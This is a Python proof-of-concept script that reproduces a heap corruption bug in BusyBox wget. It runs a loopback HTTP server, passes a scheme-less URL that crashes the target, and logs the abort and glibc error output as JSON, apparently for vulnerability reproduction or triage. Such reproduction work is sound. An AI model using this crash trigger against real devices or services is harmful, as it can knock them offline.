#!/usr/bin/env python3
"""Minimal loopback HTTP trigger for BusyBox wget (1.29.0.git).

A scheme-less URL such as ``127.0.0.1:<port>?x`` makes BusyBox wget shift its
host string one byte *before* the start of its heap allocation while splitting
the query/fragment from the host.  Once a valid HTTP reply has been consumed,
freeing the affected allocation triggers glibc's heap corruption check and the
process aborts with SIGABRT.
"""

import argparse
import json
import os
import signal as signal_module
import socket
import subprocess
import tempfile
import threading
import time


RESPONSE = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal_module.Signals(-returncode).name
    except (ValueError, AttributeError):
        return None


def stable_evidence(stderr):
    for line in stderr.splitlines():
        lowered = line.lower()
        if "double free" in lowered or "corruption" in lowered:
            return line.strip()
    return None


def run_target(binary, command, timeout):
    env = dict(os.environ)
    env.update(
        {
            "LC_ALL": "C",
            "LANG": "C",
            "http_proxy": "",
            "HTTP_PROXY": "",
            "https_proxy": "",
            "HTTPS_PROXY": "",
            "ftp_proxy": "",
            "FTP_PROXY": "",
        }
    )

    started = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            env=env,
            check=False,
        )
        runtime_ms = int((time.monotonic() - started) * 1000)
        returncode = proc.returncode
        stdout = proc.stdout.decode("utf-8", "replace")
        stderr = proc.stderr.decode("utf-8", "replace")
        timed_out = False
        error = None
    except subprocess.TimeoutExpired:
        runtime_ms = int((time.monotonic() - started) * 1000)
        returncode = None
        stdout = ""
        stderr = ""
        timed_out = True
        error = "target timed out"

    evidence = stable_evidence(stderr)
    if evidence is None and signal_name(returncode) is not None:
        evidence = stderr.strip()

    result = {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "stderr",
            "value": evidence if evidence is not None else stderr,
            "path": None,
        },
        "error": error,
    }
    return result


def main(argv=None):
    parser = argparse.ArgumentParser(description="BusyBox wget heap corruption PoC")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", help="write JSON result to this file")
    parser.add_argument(
        "--timeout",
        type=float,
        default=15.0,
        help="per-run timeout in seconds (default: 15)",
    )
    args = parser.parse_args(argv)

    binary = os.path.abspath(args.binary)
    if not os.path.isfile(binary):
        raise SystemExit(f"binary not found: {binary}")

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(("127.0.0.1", 0))
    server_sock.listen(1)
    server_sock.settimeout(max(1.0, args.timeout))
    port = server_sock.getsockname()[1]

    def serve_once():
        try:
            conn, _ = server_sock.accept()
            with conn:
                conn.recv(4096)
                try:
                    conn.sendall(RESPONSE)
                except OSError:
                    pass
        except OSError:
            pass
        finally:
            try:
                server_sock.close()
            except OSError:
                pass

    server_thread = threading.Thread(target=serve_once, daemon=True)
    server_thread.start()

    with tempfile.TemporaryDirectory(prefix="busybox-wget-poc-") as tmpdir:
        output_file = os.path.join(tmpdir, "download.bin")
        url = f"127.0.0.1:{port}?x"
        command = [binary, "wget", "-O", output_file, url]

        result = run_target(binary, command, args.timeout)
    result["command"] = command

    try:
        server_sock.close()
    except OSError:
        pass
    server_thread.join(2.0)

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(text + "\n")
    else:
        print(text)

    return 0


if __name__ == "__main__":
    main()
